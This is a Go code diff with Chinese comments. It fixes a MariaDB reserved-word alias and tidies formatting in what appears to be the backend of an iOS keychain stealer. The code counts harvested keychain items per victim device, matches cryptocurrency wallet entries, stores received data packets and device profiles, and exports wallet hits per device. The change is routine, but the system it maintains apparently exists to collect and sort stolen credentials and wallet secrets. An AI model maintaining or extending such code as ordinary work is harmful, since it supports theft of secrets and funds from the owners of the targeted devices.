@@ -102,13 +102,16 @@ func KeychainDevices() []map[string]any {
                SUM(CASE WHEN tbl='genp'  THEN 1 ELSE 0 END) AS genp,
                SUM(CASE WHEN tbl='inet'  THEN 1 ELSE 0 END) AS inet,
                SUM(CASE WHEN tbl='cert'  THEN 1 ELSE 0 END) AS cert,
-               SUM(CASE WHEN tbl='keys'  THEN 1 ELSE 0 END) AS keys,
+               SUM(CASE WHEN tbl='keys'  THEN 1 ELSE 0 END) AS kc_keys,
                SUM(CASE WHEN wallet_rule IS NOT NULL AND wallet_rule<>'' THEN 1 ELSE 0 END) AS wallet_items,
                COUNT(DISTINCT CASE WHEN wallet_rule IS NOT NULL AND wallet_rule<>'' THEN wallet_rule END) AS wallet_kinds,
                MAX(last_seen)                 AS last_recv,
                MAX(last_packet_id)            AS war_pid
         FROM keychain_items GROUP BY device_uuid ORDER BY last_recv DESC`)
 	for _, r := range rows {
+		// `keys` 是 MariaDB 保留字，raw string 内无法用反引号转义 → 别名 kc_keys，
+		// 此处回填成对外字段名 keys，保持接口形状不变。
+		r["keys"] = r["kc_keys"]
 		if pid := toInt(r["war_pid"]); pid > 0 {
 			if p := db.QueryOne("SELECT file_path FROM packets WHERE id=?", pid); p != nil {
 				fp := toStr(p["file_path"])
@@ -188,8 +191,8 @@ func ResultDetail(id int64) map[string]any {
 // ── 设备档案 ──
 func ListProfiles() []map[string]any {
 	return GetDB().Query(
-		"SELECT uuid, machine, device_name, ios_version, build_version, hostname, sysname,"+
-			" `release`, kern_version, ip, source, first_seen, last_seen"+
+		"SELECT uuid, machine, device_name, ios_version, build_version, hostname, sysname," +
+			" `release`, kern_version, ip, source, first_seen, last_seen" +
 			" FROM device_profiles ORDER BY last_seen DESC")
 }
 
@@ -314,18 +317,18 @@ func WalletsExport(deviceUUID string) map[string]any {
 				entries = append(entries, r)
 			}
 			wallets = append(wallets, map[string]any{
-				"wallet":      rule,
-				"display":     Display(rule),
-				"count":       toInt(rl["n"]),
-				"entries":     entries,
+				"wallet":  rule,
+				"display": Display(rule),
+				"count":   toInt(rl["n"]),
+				"entries": entries,
 			})
 		}
 		devArr = append(devArr, map[string]any{
-			"device_uuid":   u2,
-			"last_seen":     d["last_ts"],
-			"wallet_hits":   toInt(g["wallet_hits"]),
-			"wallet_kinds":  toInt(g["wallet_kinds"]),
-			"wallets":       wallets,
+			"device_uuid":  u2,
+			"last_seen":    d["last_ts"],
+			"wallet_hits":  toInt(g["wallet_hits"]),
+			"wallet_kinds": toInt(g["wallet_kinds"]),
+			"wallets":      wallets,
 		})
 	}
 	out["devices"] = devArr
